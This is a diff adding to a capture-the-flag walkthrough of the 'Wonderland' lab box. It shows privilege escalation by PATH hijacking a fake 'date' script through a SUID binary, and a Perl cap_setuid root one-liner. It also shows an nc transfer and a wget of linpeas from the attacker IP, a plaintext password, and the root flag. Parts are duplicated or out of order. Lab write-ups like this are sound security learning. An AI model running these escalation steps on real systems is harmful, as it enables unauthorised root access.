@@ -120,3 +120,125 @@ rabbit@wonderland:/home/rabbit$ nc 10.18.1.77 4444 < teaParty
 46635.py                  hashes.txt                    SAM
 backdoors                 hash.txt                      shadow.txt
 backup.zip                id_rsa                        SharpGPOAbuse
+buildscript.sh            id_rsa_robert                 SharpGPOAbuse.exe
+Chankro                   key                           shell.php
+cracking.txt              KIBA                          socat
+credential.pgp            Lian_Yu                       solar_log4j
+CustomerDetails.xlsx      linpeas.sh                    startup.bat
+CustomerDetails.xlsx.gpg  Market_Place                  SYSTEM
+Devservice.exe            NAX                           system.txt
+download.dat              overpass2.pcapng              teaParty
+
+void main() {
+    setuid(0x3eb);
+    setgid(0x3eb);
+    puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
+    system("/bin/echo -n 'Probably by ' && date --date='next hour' -R");
+    puts("Ask very nicely, and I will give you some tea while you wait for him");
+    getchar();
+    puts("Segmentation fault (core dumped)");
+    return;
+}
+
+As we can see, the executable will display a fake segmentation fault message. It is run as root and has the SUID bit set. It manipulates the date function to echo the current datetime + 1 hour. This is likely something we can exploit by hooking the date function.
+
+rabbit@wonderland:/home/rabbit$ cat > date << EOF
+> #!/bin/bash
+> /bin/bash
+> EOF
+rabbit@wonderland:/home/rabbit$ chmod +x date
+rabbit@wonderland:/home/rabbit$ ls
+date  teaParty
+rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
+rabbit@wonderland:/home/rabbit$ ./teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+hatter@wonderland:/home/rabbit$ 
+
+From hatter to root (privesc)
+
+Now that we have successfully switched to the hatter user, let’s check what we have in our home directory:
+
+hatter@wonderland:/home/rabbit$ cd /home/hatter/
+hatter@wonderland:/home/hatter$ cat password.txt 
+WhyIsARavenLikeAWritingDesk?
+
+This is our password. We can check our privileges, but we have none, actually:
+
+hatter@wonderland:/home/hatter$ sudo -l
+[sudo] password for hatter: 
+Sorry, user hatter may not run sudo on wonderland.
+
+Also checked crontab, but we have none, checked the files owned by hatter, nothing we can exploit. Let’s upload linpeas. Make sure you run all tests (linpeas.sh -a).
+
+The interesting stuff is about Perl:
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+
+Go to https://gtfobins.github.io/gtfobins/perl/ to check the capabilities section of Perl. Let’s get root access:
+
+hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+root@wonderland:~# whoami
+root
+root@wonderland:~# cat /home/alice/root.txt 
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+
+Root flag: thm{Twinkle, twinkle, little bat! How I wonder what you’re at!} 
+
+It appears that Perl has capabilities enabled:
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh hatter@10.10.122.82
+hatter@10.10.122.82's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jul 31 02:28:43 UTC 2022
+
+  System load:  0.0                Processes:           84
+  Usage of /:   18.9% of 19.56GB   Users logged in:     0
+  Memory usage: 34%                IP address for eth0: 10.10.122.82
+  Swap usage:   0%
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+after executing linpeas.sh
+wget 10.18.1.77/linpeas.sh
+chmod +x linpeas.sh
+
+Files with capabilities (limited to 50):
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+
+hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+root@wonderland:~# ls
+linpeas.sh  linpeas.sh.1  password.txt
+root@wonderland:~# cd /home/alice
+root@wonderland:/home/alice# ls
+random.py  root.txt  walrus_and_the_carpenter.py
+root@wonderland:/home/alice# cat root.txt 
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+root@wonderland:/home/alice#
+```
+
+## Notes / Lessons Learned
+[[TOR]]
+
